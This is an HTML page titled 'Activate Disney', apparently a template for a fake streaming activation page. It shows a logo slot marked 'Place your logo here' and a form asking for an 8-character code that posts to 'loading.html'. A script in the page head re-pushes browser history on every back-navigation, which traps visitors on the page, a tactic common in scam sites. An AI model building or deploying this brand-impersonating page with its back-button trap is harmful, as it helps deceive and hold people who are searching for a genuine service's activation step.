
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Activate Disney</title>
<style>
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        background-color: #000000; /* Black background */
        display: flex;
        flex-direction: column;
        align-items: center;
        height: 100vh;
    }
    .containerlogo {
        text-align: center;
        padding: 10px;
        background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent black background */
        border-radius: 10px;
        width: 90%;
        max-width: 400px;
        margin-top: 10px; /* Adjust if needed */
    }
    .logo {
        width: 250px;
        display: block;
        margin: 0 auto 0px; /* Logo at the top center */
    }
    .container {
        text-align: center;
        padding: 20px;
        background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent black background */
        border-radius: 10px;
        width: 90%;
        max-width: 400px;
        margin-top: 0px; /* Increased top margin */
    }
    h2 {
        color: #ffffff; /* White color text */
        margin: 20px 0;
    }
    input, button {
        margin: 10px 0;
        padding: 10px;
        width: calc(100% - 20px);
        box-sizing: border-box;
    }
    button {
        background-color: #FFA500;
        color: white;
        border: none;
        cursor: pointer;
        font-size:18px;
        width : 150px;
        border-radius: 10px;
    }
    button:hover {
        background-color: #0056b3;
    }
</style>
<script>
        window.onload = function() {
            window.history.pushState(null, "", window.location.href);        
            window.onpopstate = function() {
                window.history.pushState(null, "", window.location.href);
            };
        };
    </script>
</head>
<body>
<div class="containerlogo">
    <img src="logo.png" alt="Logo" class="logo"> <!-- Place your logo here -->
</div>
<div class="container">
    <h2>Enter your Activation Code</h2>
    <form action="loading.html" method="post">
        <input id="uppercaseInput" type="text" placeholder="Enter Your Code" maxlength="8" minlength="8" required>
        <button type="submit">Activate</button>
    </form>
</div>
<script>
    // JavaScript to convert input value to uppercase
    document.getElementById('uppercaseInput').addEventListener('input', function() {
        this.value = this.value.toUpperCase();
    });
</script>
